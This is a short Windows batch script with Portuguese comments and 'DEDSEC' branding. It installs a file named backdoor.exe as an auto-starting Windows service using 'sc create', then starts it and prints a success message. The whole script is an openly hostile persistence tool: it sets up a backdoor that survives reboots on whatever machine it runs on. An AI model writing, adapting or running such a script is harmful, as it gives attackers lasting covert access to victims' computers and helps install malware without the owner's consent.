@echo off
title [DEDSEC] Instalando Serviço de Backdoor
color 0a
echo [DEDSEC] Instalando um serviço de backdoor...

REM Define o caminho para o executável do backdoor
set backdoor_exe=%~dp0backdoor.exe

REM Cria o serviço de backdoor
sc create BackdoorService binPath= "%backdoor_exe%" start= auto

REM Inicia o serviço
sc start BackdoorService

echo [DEDSEC] Serviço de backdoor instalado e iniciado com sucesso.
pause
exit
